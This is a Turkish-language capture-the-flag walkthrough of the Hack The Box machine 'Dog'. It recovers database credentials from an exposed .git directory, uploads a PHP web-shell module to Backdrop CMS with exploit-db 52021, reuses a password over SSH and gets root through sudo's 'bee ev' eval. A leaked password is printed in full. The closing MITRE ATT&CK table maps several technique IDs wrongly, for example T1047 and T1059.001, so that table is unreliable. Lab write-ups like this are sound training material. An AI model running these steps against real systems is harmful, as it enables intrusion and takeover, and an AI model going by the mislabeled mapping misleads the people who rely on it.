---
title: Dog
tags:
  - HTB
  - easy
---

#### Author: **Xera**

---

# Recon 

### Nmap

```bash
nmap -sC -sV -A -oA Dog 10.10.11.58
```

```bash
# Nmap 7.95 scan initiated Thu Apr 24 13:19:21 2025 as: /usr/lib/nmap/nmap --privileged -sC -sV -A -v -oA Dog 10.10.11.58
Nmap scan report for 10.10.11.58
Host is up (0.19s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 97:2a:d2:2c:89:8a:d3:ed:4d:ac:00:d2:1e:87:49:a7 (RSA)
|   256 27:7c:3c:eb:0f:26:e9:62:59:0f:0f:b1:38:c9:ae:2b (ECDSA)
|_  256 93:88:47:4c:69:af:72:16:09:4c:ba:77:1e:3b:3b:eb (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-generator: Backdrop CMS 1 (https://backdropcms.org)
|_http-title: Home | Dog
| http-git: 
|   10.10.11.58:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: todo: customize url aliases.  reference:https://docs.backdro...
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-favicon: Unknown favicon MD5: 3836E83A3E835A26D789DDA9E78C5510
| http-robots.txt: 22 disallowed entries (15 shown)
| /core/ /profiles/ /README.md /web.config /admin 
| /comment/reply /filter/tips /node/add /search /user/register 
|_/user/password /user/login /user/logout /?q=admin /?q=comment/reply
Device type: general purpose
Running: Linux 5.X
OS CPE: cpe:/o:linux:linux_kernel:5
OS details: Linux 5.0 - 5.14
Uptime guess: 2.584 days (since Mon Apr 21 23:18:40 2025)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=257 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 8080/tcp)
HOP RTT       ADDRESS
1   140.98 ms 10.10.14.1
2   141.09 ms 10.10.11.58

Read data files from: /usr/share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Apr 24 13:19:57 2025 -- 1 IP address (1 host up) scanned in 36.40 seconds
```

### settings.php Elde Etme

```bash
python3 GitHack.py http://10.10.11.58
cd 10.10.11.58

---

cat settings.php| head -n15

---

Çıktı : 

<?php
/**
 * @file
 * Main Backdrop CMS configuration file.
 */

/**
 * Database configuration:
 *
 * Most sites can configure their database by entering the connection string
 * below. If using primary/replica databases or multiple connections, see the
 * advanced database documentation at
 * https://api.backdropcms.org/database-configuration
 */
$database = 'mysql://root:BackDropJ20{redacted}@127.0.0.1/backdrop';

---

grep -r dog.htb
```

### Authenticated CMS Login

#### Kullanıcı Bilgileri
Kullanıcı: tiffany
Şifre: BackDropJ2024DS2024

---

# Exploitation | User.txt

Burada Backdrop CMS 1.27.1 sürümündeki zafiyet kullanacağız.

https://www.exploit-db.com/exploits/52021

```bash
python3 52021.py http://10.10.11.58
```

```bash
tar -cvf shell.tar shell/
```

Bu işlemlerin ardından sitenin modül yükleme bölümünden modülümüzü .tar formatında yükleyip modülü aşşağıdaki siteye giderek çalıştırıyoruz.

```bash
http://10.10.11.58/modules/shell/shell.php
```

Ardından çıkan sitede

```bash
cat /etc/passwd | grep bash
```

komutunu giriyoruz.

Sonrasında çıktıya göre sisteme johncusack:BackDropJ20 bilgileri ile ssh atıyoruz.

Burada User.txt'ye ulaşmış oluyoruz.

---

# Exploitation | Root.txt | Privilege Escalation

Burada sudo -l komutunu kullanıyoruz. 

Çıktı: 
```bash
(ALL : ALL) /usr/local/bin/bee
```

Ardından Eval ile Root komutu yazabildiğimizi öğreniyoruz

```bash
cd /var/www/html/

sudo /usr/local/bin/bee ev "system('cat /root/root.txt')"
```

Bu komutlar sonrasında root.txt'ye de ulaşmış oluyoruz.

---

### MITRE ATT&CK Teknikleri

| Teknik ID     | Açıklama                                     |
|---------------|----------------------------------------------|
| T1592.001     | Web Application Fingerprinting               |
| T1210         | Exploitation of Remote Services              |
| T1078         | Valid Accounts                               |
| T1203         | Exploitation for Client Execution            |
| T1059.003     | PHP Command Execution                        |
| T1047         | System Discovery via system()                |
| T1021.004     | Remote Services: SSH                         |
| T1068         | Privilege Escalation via Sudo-enabled Binary|
| T1059.001     | Bash Shell Execution                         |
